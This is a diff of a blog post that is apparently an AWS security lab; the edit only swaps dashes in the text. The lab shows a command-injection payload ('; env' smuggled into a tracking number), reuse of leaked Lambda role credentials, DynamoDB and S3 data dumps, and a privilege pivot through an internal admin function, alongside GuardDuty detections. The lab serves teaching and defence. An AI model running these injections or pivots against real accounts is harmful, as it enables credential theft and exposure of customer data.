@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — Lambda Attack Chain: From API Gateway Injection to AWS Account Pivot"
+title: "Lab: Lambda Attack Chain: From API Gateway Injection to AWS Account Pivot"
 date: 2026-07-04T10:00:00
 categories:
   - AWS Security Labs
@@ -16,7 +16,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating how a command injection flaw in a Lambda function behind API Gateway leaks execution role credentials and environment-variable secrets, then how the over-privileged execution role is abused to pivot into DynamoDB and a second, "internal-only" Lambda function — with GuardDuty Lambda Protection detection and least-privilege fixes.
+description: A hands-on lab demonstrating how a command injection flaw in a Lambda function behind API Gateway leaks execution role credentials and environment-variable secrets, then how the over-privileged execution role is abused to pivot into DynamoDB and a second, "internal-only" Lambda function - with GuardDuty Lambda Protection detection and least-privilege fixes.
 toc: true
 pin: false
 math: false
@@ -63,7 +63,7 @@ Lambda execution environment (function: order-processor)
     ▼
 Stolen execution role credentials (used from outside Lambda entirely)
     │
-    │  Step 4: Enumerate & pivot — DynamoDB, S3, list other Lambda functions
+    │  Step 4: Enumerate & pivot - DynamoDB, S3, list other Lambda functions
     │  Step 5: Directly invoke the "admin-tasks" internal-only function
     ▼
 Full data-plane compromise: customer PII exposed + admin function abused
@@ -78,18 +78,18 @@ API Gateway: orders-api (public REST API)
     │
     └── POST /track-order → Lambda: order-processor
             Execution role: order-processor-role
-              - dynamodb:* on orders-table          (over-scoped — should be Get/PutItem only)
+              - dynamodb:* on orders-table          (over-scoped - should be Get/PutItem only)
               - s3:GetObject / s3:PutObject on customer-exports/*
-              - lambda:InvokeFunction on *           (over-scoped — no resource restriction)
+              - lambda:InvokeFunction on *           (over-scoped - no resource restriction)
             Environment variables (plaintext, unencrypted):
               - DB_PASSWORD   = "Sup3rSecret!23"
               - STRIPE_API_KEY = "sk_live_51H8x...redacted"
 
-    Lambda: admin-tasks (internal only — meant to run only on an EventBridge schedule)
+    Lambda: admin-tasks (internal only - meant to run only on an EventBridge schedule)
         Execution role: admin-tasks-role
           - iam:CreateAccessKey, iam:AttachUserPolicy
           - dynamodb:DeleteTable
-        No resource-based policy restricting who can invoke it —
+        No resource-based policy restricting who can invoke it  - 
         anyone holding credentials with lambda:InvokeFunction can call it directly.
 ```
 
@@ -119,7 +119,7 @@ aws s3 mb s3://customer-exports-lab-demo
 
 ### Step 0.2 Write the Vulnerable Lambda Function
 
-The `/track-order` endpoint "validates" a carrier tracking number by shelling out to `nslookup` against a carrier-lookup hostname built from user input — a real-world anti-pattern for anything that touches a shell.
+The `/track-order` endpoint "validates" a carrier tracking number by shelling out to `nslookup` against a carrier-lookup hostname built from user input - a real-world anti-pattern for anything that touches a shell.
 
 ```python
 # order_processor/app.py
@@ -253,7 +253,7 @@ aws lambda create-function \
   --timeout 10
 
 # MISCONFIGURATION: no resource-based policy restricting who can invoke this
-# function — it was designed to be triggered only by an EventBridge rule, but
+# function: it was designed to be triggered only by an EventBridge rule, but
 # nothing enforces that.
 ```
 
@@ -313,7 +313,7 @@ curl -X POST "$API_URL/track-order" \
   -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1; env"}'
 ```
 
-Response (`carrier_check`, truncated to 200 chars in the vulnerable handler — request it again with a `cut` or grep injected to page through the rest):
+Response (`carrier_check`, truncated to 200 chars in the vulnerable handler - request it again with a `cut` or grep injected to page through the rest):
 
 ```bash
 curl -X POST "$API_URL/track-order" \
@@ -359,14 +359,14 @@ aws sts get-caller-identity
 UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
 ```
 
-Lambda execution role credentials being used from an IP address outside AWS-managed ranges is just as anomalous as stolen EC2 instance credentials being used off-network — GuardDuty's credential-exfiltration detection isn't specific to EC2.
+Lambda execution role credentials being used from an IP address outside AWS-managed ranges is just as anomalous as stolen EC2 instance credentials being used off-network - GuardDuty's credential-exfiltration detection isn't specific to EC2.
 
 ---
 
 ## Phase 3  Enumerate and Pivot With Stolen Credentials
 
 ```bash
-# Dump every order — customer PII, no query restrictions on the role
+# Dump every order: customer PII, no query restrictions on the role
 aws dynamodb scan --table-name orders-table
 
 # List and pull whatever's in the exports bucket
@@ -402,7 +402,7 @@ cat response.json
 
  `aws lambda invoke` against `admin-tasks` from stolen `order-processor-role` credentials, returning a freshly minted IAM access key for `platform-admin`
 
-This is the key lesson of the lab: **Lambda-to-Lambda invocation crosses IAM role boundaries silently.** `order-processor-role` never had `iam:CreateAccessKey` itself — but by invoking `admin-tasks`, it triggered code running under `admin-tasks-role`, which does. The privilege boundary that matters isn't just "what can this role call" — it's "what can this role's calls cause to happen."
+This is the key lesson of the lab: **Lambda-to-Lambda invocation crosses IAM role boundaries silently.** `order-processor-role` never had `iam:CreateAccessKey` itself - but by invoking `admin-tasks`, it triggered code running under `admin-tasks-role`, which does. The privilege boundary that matters isn't just "what can this role call" - it's "what can this role's calls cause to happen."
 
 **GuardDuty finding:**
 
